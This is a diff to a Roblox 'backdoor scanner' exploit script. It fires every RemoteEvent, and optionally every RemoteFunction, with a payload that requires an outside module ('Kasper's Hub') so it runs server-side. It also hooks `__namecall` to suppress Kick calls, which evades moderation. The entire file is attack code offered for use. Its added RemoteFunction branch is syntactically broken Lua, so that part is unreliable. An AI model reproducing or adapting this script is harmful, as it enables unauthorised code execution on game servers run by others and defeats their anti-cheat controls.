@@ -1,20 +1,32 @@
---[[ 
+--[[
 backdoorscanner.lua
-
-this is a script to manipulate serverside remoteevent's & remotefunctions to inject a serverside script into them without granted whitelist
-
+This will inject a Require Script to randomly find RemoteEvent/RemoteFunction that handles executing Require Scripts and fire Kasper's Hub inject it.
+Bitwise#4908
 ]]
+hook = hookmetamethod(game, "__namecall", function(a, b)
+    if tostring(string.lower(getnamecallmethod())) == "Kick" then
+        return nil
+    end
+    return hook(a, b)
+end)
 
--- old version was like 700+ lines but reverted it since this works amazing with just 11 lines
-
-code = [[require(9039886698).tristytn(']]..game.Players.LocalPlayer.Name..[[')]] -- this will load kasper's hub so you can edit it up if u know how lol
-blacklisted = {'emma','__FUNCTION'}
+local RemoteFunctionsEnabled = false -- Change to true if you want to Invoke RemoteFunctions. (Might sometimes work)
+local code = [[require(9039886698).tristytn(']]..game.Players.LocalPlayer.Name..[[')]] -- This will load the Kasper's Hub but if you know how to change this feel free to.
+local blacklisted = {'emma','__FUNCTION'}
 for i,v in pairs(game:GetDescendants()) do
-   if v:IsA("RemoteFunction") or v:IsA("RemoteEvent") then
+    if v:IsA("RemoteEvent") then
        for index, value in pairs(blacklisted) do
           if v.Name ~= value then
              v:FireServer(code)
           end
        end
+if RemoteFunctionsEnabled then
+    elseif v:IsA("RemoteFunction") then
+         for index, value in pairs(blacklisted) do
+             if v.Name ~= value then
+                 v:InvokeServer(code)
+                 end
+             end
+         end
     end
 end
